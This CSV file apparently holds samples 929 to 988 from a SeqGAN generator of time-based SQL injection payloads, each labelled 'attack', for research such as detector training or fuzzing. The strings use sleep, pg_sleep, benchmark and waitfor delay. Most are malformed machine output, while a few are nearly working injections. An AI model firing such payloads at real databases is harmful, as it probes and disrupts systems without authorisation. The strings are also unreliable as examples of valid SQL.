label,payload,family,payload_type,method,run_id,sample_index
attack,"select 3824  =  (5000000,md5  (  5  )   # rvhufs rle from   (  select 6793from   (  )   (  select 6793  (  =  1210,sleep  (  benchmark  =  7021 from or elta 4240 from or 6793  =  0x6d457153benchmark --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,929
attack,  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,930
attack,"1%'    and 8514  =  benchmark  (  5   and    (     )     )   and    (    (    (  select 6969 from 8514  =  6272  =  ( benchmark  (  5000000,  =from  (  =  1568 from pg_sleep  (  5000000,from   (  select  (  5   )     )  sdd from --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,931
attack," sleep  ""uvzc"" where 7021 d5  (  8507  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,932
attack," 6969 and elt  (  5   )    )     )   )     (  select 8667   from from  =,sleep  (  5000000,md5  (  select  (  5   )       (  select 6793 from pg_sleep  (  5000000,md5  (  5   )     )  vsddiq and   sddo  )   )     ew(  select * pg_sleep  (  5   )    (     (  )  )   and   (     (  5000000,mdwaitfor(  )  )rumkuse   from from   (  5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,933
attack,1 and benchmark  (  select from pg_sleep  (  7305  (  5   )     )  sefrom   (  select 4240 from from from from   8466  =  6272 from   (  sleep  (  5  )f)   and    (    (    )   -- 'sa' '0:0:2' from delay 9008 from 6969  'hrta'  =  benchmark  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,934
attack,1 or 8514  1210  =  2044 benchmark   from pg_sleep sleep  (  5   (  select 6793 from from pg_sleep  (  5   (  select * from   (  sleep  (  sleep  (  5   )    )     )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,935
attack,"select sleep  (  5   )     )   where '0:0:2' from from pg_sleep  =  (  ""uvzc"" and    (     (  select or 6793  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,936
attack,1 where 2239  =  (  0x544d5a4c   )     )     )rgcq,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,937
attack,"1"" where 6793 from pg_sleep  (  (    (  5    )    )     )  sddo  ) 1679 'zfcyqvu",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,938
attack," * from pg_sleep  ( * from pg_sleep  (  5   )   (pq  )     )   and e 3824  (  5000000,md5  (  select from pg_sleep  (  5   )     )    )     )   -- 5874  =    (  select 4240 from from pg_sleep  (  (  sleep  (  5   )    )   and   (  select 4240 from from   (  select  (  sleep  (  5   )    asee    (  select delay   (  6272    (  select benchmark sleep  (  2044 from   (  sleep  (  5000000,md",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,939
attack,select sleep  (  5   )    and 8514  =  0x544d5a4c  pg_sleep  (  select from   from   (  5  sddh nzp,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,940
attack,select benchmark  (  5  )    (   select sleep  (  5   )    )   <> like    (  'hrta'u  )    and   (  select 6793 from pg_sleep  (  5   )    )    )   where 'yfvu' from from   (  select 6969 from from   (  sleep  (  select  (  select  (  if or elt  (  5   <> ki 'sa' from pg_sleep  (  benchmark  (  0x544d5a4c 4240 '0:0:5'    (vomd5  )     4240  =    (    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,941
attack,select sleep  (  5  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,942
attack,"1'  )   waitfor delay '0:0:0:""  (  5   )    (     (  select from    and 8594 d"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""zq",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,943
attack,"1'  )   waitfor delay '0:0:5'' like 'zhvike"" like ""ojpe",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,944
attack, sleep    (  select d   (  '  (  5   )    and    (    (  select sleep  (  5   )    )     )  '%'u 1 or 8466      (  select 8594 from from from from   (  0x694a4745   #  select  =  (  sleep  (  5   )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,945
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojper     )   (    )    rlikeg    (  5   )    (     (  select 6793 or 8466  =  "" from from pg_sleep  0x544d5a4c   (  sleep  (  0x6d457153   )    (  select  (  (  0x694a4745   )    )     )    (  select 6969 from or 'sa' pg_sleep  select sleep  sr  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,946
attack,"select    (     (  ""uvzc""  )    )   or 8466waitfor from   (  5  stddhmbmdo  )    )     )  sddo  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,947
attack,select ! from from pg_sleep  (  sleep  (  5   )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,948
attack,"select sleep  (  0x694a4745   )    and    (  select    (  select or 8466  =  5000000(  =  1210  (  benchmark  (  =  7021 (  5000000,md5  (  5   )     -- ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,949
attack,"select sleep  (  5   )     )  s kuq  )   (  select * from   (  select  =  5000000,md5  (  select,sleep  (  5000000,md5  (  5000000,md5  (  5   )    and    (    (  szno  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,950
attack,select '0:0:5')     )    r where not  (  5   )    )soe 6969 8514  =  7279 and elt  (  5   )     stdq  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,951
attack,"select    (  '%'  select * from   (  select  sleep  (  5  )   )    )     )     )   'rnzp'  )   (  select * from   (  select  (    (  5   )    )     )  ste where d5  (  5000000,l  =  (  benchmark  (  5000000,md5  (  select  (  5   )    and     select 8514  =  6967 from pg_sleep frommd5  (  0x544d5a4c   (  5000000,md5  select and sleep  (  sleep  (  5   )    (  select * sleep  (  5   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,952
attack,"0x544d5a4cra)   or   (     4240   (  select 6793  =    (    (  (  5000000,md5  (  select 3824   (  5000000,md5  (  5   )    )     8514  =    (  select    )=  (  =  6272=    )     )    and   (  select 4240 from 1568 sleep  (  5   )    )   and    (    #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,953
attack, select 4240  # 'yfvu' a(  )    and   (  select el,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,954
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'p",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,955
attack,"waitfor sleep  (  5 and from from       (  select  =  (  =  (  5000000,md5  (  select 6793 from pg_sleep  (  5   )    (  se)   # 4240 from ke   (  yddu  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,956
attack, '  (  select * from from   (  select  sleep  (  5  )   #f,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,957
attack,select from pg_sleep  (  5   )    )    as dhiq where from   (    (       (  select sleep  (  5   )    and    (    (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,958
attack,"1"" pg_sleep(    )   and    (    (    (  select * from   (  select 4240  =  1210,sleep  (  5   )     )     )   <> emd5  (  0x544d5a4c   )    )    or 8466  =  (  5   )    as)  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,959
attack,1 or 6969 from--e   (  0x544d5a4c   )    )    9649   )    as diq rlt  )  gcrv,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,960
attack,1  )   and    (    (    (     (  select 8594 from from   (  sleep  (  5   )     )    ruvz1210uu,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,961
attack,"1"" or 8514 from 3824  0x4c4d6142   )     )  vzc",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,962
attack,"1"" pg_sleep  s a where sleep  6272  =  benchmark  (  5   )    benchmark     sgpdk",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,963
attack,select 3824 waitfor from 6793md5  (  select * from   (  5    (  select 4240 from from pg_sleep  (  select  (  (  5   )    )    and elsleep  (  5   )     )   *mq  )  -- e and from from   (  select  (  5   (  select* from   (  )  sdd5  )  sddmq  )  gcrrrus (  ) and 6383  =  benchmark  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,964
attack, 7279 6793 from pg_sleep  (  5   )     )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,965
attack,do')   )    (  select from   (  (  select 4240 from pg_sleep  (  sleep  (  0x544d5a4c   (  0x76555642   and    (  #zqfy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,966
attack,0x544d5a4c6969)   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,967
attack, 'yfvu' 6969 from   (  6272taru like do  sre  <> * from   (  select  (  sleep  (  5   )    )     (  0x544d5a4c   )     ),time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,968
attack,1 or 4240  =    (     (hggp,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,969
attack,"select where pg_sleep  (  5000000,md5  (  5   )    )    ru 6969 from   (    6793  =  4683  wc""pu",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,970
attack, sleep5     (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,971
attack,select sleep  (  0x544d5a4c   (  select (  (  5   <> 8594  =    (    (  select 6969 from pg_sleep  (  select or 6969  =  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,972
attack,1 and from   where from   (  sleep  sleep   (  select 8594 from from   (  (  sleep  5   ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,973
attack,"1 where 1568  =  5000000,md5  (  (  0x76555642   (  5   and    (    (  select 4240 from from from   (  0x544d5a4c   (  select(  =  (  0x544d5a4c   )    )     )    (  select   (  5000000,md5  (  (  5  )   (  select    (    (f  (     5   )  #  select 2388  =  1568 from   (  5   )(  5000000,md5  (  5   and    (   select sleep  (  5   )     )     )   'rnzp'd5  )     )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,974
attack, 5  )   )    and   (     (  select 6969 from   (  select  (  5   and    (     (  1915  1915,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,975
attack,"1 where 1132  5000000,md5  (  select 6793 from from from   )  (  select  (  sleep  (  5   )         (    (  select sleep  (  select   (  5   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,976
attack,"1 where waitfor delay from sleep  (  select  (  5   and   (  select 6969 from   )    and    (    (     (  ""wucy"" 8466  =  7196 and from   (  select sleep  (      (  5000000,mdm sleep  (  5   )    )     )   (  select * from   (  select  (  5  )   (    (  select 6969 from   (  select 4240 ,,sleep asriq 'yfvu' elt)   and   (     (  select)  as dpuq like      from   (  1210    (",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,977
attack,"1'  )   waitfor delay '0:0:5')   (  select * from   (  select  sleep sleep  (  sleep  (  5   )    (  select * fromnot  (    select 4240 from pg_sleep  (  5000000,md5  (  5r",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,978
attack,"select sleep  (  ""%""  =  7305 and 6969 from from from pg_sleep  (  5   (  select 4240 from pg_sleep  (  1679 4240 from from   (  sleep  (  sleep  (  5   )     )    and    (  select 6793 from if from   (  0x4c4d6142   )    and   (  select 8514  =  9008 * from   (  sleep  (  5   )     )  set  (  5   as k  'fegp'  =    (6793  =    (    (  select 4240 from pg_sleep  (  select   (  sleep  (  5   )",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,979
attack,select (  5  )   rlike(  0x76555642   s 'yfvu' 'yfvu' waitfor '0:0:5'   4683 6793  =    (  select 4240 from if from from   (     select  (  sleep  (  5   )    )    selt  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,980
attack,"1 where 8507  =  1568 'sa'    k  =    (  4683 from pg_sleep  12105000000,md5    (  select * from   (  0x544d5a4c  ""zlal""  =  2841 ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,981
attack,1 where 8252  (  =  1132 from 4240 from pg_sleep  (  0x544d5a4c   )    )    and    (    (  select * from   (  select  select 3824  =  (  5   )    and   'wyvx'  =    (     (     (  select * from   (  0x694a4745   )    (  select * from from   (  select  (  sleep  (  select  (  5   )    and   (  select 6793 from pg_sleep  (  0x544d5a4c   from pg_sleep  (  5000000   (  select sleep  (  sleep  (  5   )    )     )  sdd5  select ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,982
attack,select pg_sleep  (  0x4c4d6142   )     )    rusddmo  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,983
attack,1 or 8514  =  0x694a4745rgp,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,984
attack,"select benchmark  (  5   )     (  0x544d5a4c   reguv6866 ""f",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,985
attack,1 or   (  select * from   (  5   -- '0:0:5' '0:0:5'--u,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,986
attack," 8594 6272 from pg_sleep  (  5   )    (  select 8594 pg_sleep  (  5   )     )     )   -- ee   (  select 3824 6969 from 4240  =  (  5  )   where from from   (  select  (    (  5   and 4240    )  sddo  =  5874 rh from where 4240  =  7305 where sleep  =  (  5000000,md5  select (  5(  select * from   (  select  (  sleep  (  (    sleep  (  (  5   )     )    )   and like",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,987
attack,     )   #  select * from from(  sleep  (  select pg_sleep  (  5   )     ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,988
